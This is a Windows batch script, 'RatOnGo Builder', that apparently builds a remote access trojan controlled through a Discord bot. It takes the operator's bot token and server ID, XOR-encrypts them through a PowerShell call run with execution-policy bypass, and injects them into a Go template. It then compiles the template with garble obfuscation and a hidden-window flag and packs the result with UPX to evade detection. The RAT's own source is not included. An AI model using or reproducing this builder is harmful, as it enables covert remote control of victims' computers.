@echo off
title RatOnGo Builder - by ng/wesk
setlocal enabledelayedexpansion

set TEMPLATE_FILE=main.go
set TEMP_FILE=main_temp.go
set GO_BINARY_NAME=RatOnGo.exe
set UPX_PATH=.\upx\upx.exe
set KEY=5A

if exist %GO_BINARY_NAME% del %GO_BINARY_NAME%
if exist %TEMP_FILE% del %TEMP_FILE%

echo.
echo Welcome to the RatOnGo builder!
echo This script will encrypt your token, obfuscate the binary, and build the executable.
echo.

where garble >nul 2>&1
if errorlevel 1 (
    echo Garble not found. Installing...
    go install mvdan.cc/garble@latest
)

set /p "TOKEN=Paste your Discord bot token: "
set /p "GUILD_ID=Enter your server (guild) ID: "

call :encrypt "%TOKEN%" TOKEN_ENC
call :encrypt "%GUILD_ID%" GUILD_ENC

echo Injecting encrypted data...
(
    for /f "usebackq delims=" %%a in ("%TEMPLATE_FILE%") do (
        set "line=%%a"
        set "line=!line:YOUR_ENCRYPTED_TOKEN_HERE=%TOKEN_ENC%!"
        set "line=!line:YOUR_ENCRYPTED_GUILDID_HERE=%GUILD_ENC%!"
        echo(!line!
    )
) > %TEMP_FILE%

echo Building the binary with garble...
garble build -ldflags="-s -w -H=windowsgui" -o %GO_BINARY_NAME% %TEMP_FILE%
if %errorlevel% neq 0 (
    echo ERROR: Garble build failed.
    pause
    goto cleanup
)
echo Build successful.

echo Compressing with UPX...
if not exist "%UPX_PATH%" (
    echo ERROR: upx.exe not found in the 'upx' folder.
    pause
    goto cleanup
)
%UPX_PATH% --brute --overlay=strip --strip-relocs=0 %GO_BINARY_NAME% >nul
if %errorlevel% neq 0 (
    echo WARNING: UPX compression failed.
) else (
    echo Compression finished.
)

echo.
echo Done! Your file is ready: %GO_BINARY_NAME%
echo.

:cleanup
if exist %TEMP_FILE% del %TEMP_FILE%
pause
exit /b

:encrypt
setlocal enabledelayedexpansion
set "input=%~1"
set "result="

echo $input = '%~1'; $key = 0x%KEY%; $bytes = [System.Text.Encoding]::UTF8.GetBytes($input); $encrypted = @(); foreach($b in $bytes) { $encrypted += '0x{0:X2},' -f ($b -bxor $key) }; $encrypted -join '' > temp_encrypt.ps1

for /f "delims=" %%i in ('powershell -ExecutionPolicy Bypass -File temp_encrypt.ps1') do (
    set "result=%%i"
)

if exist temp_encrypt.ps1 del temp_encrypt.ps1

set "result=!result:~0,-1!"

endlocal & set "%2=%result%"
exit /b


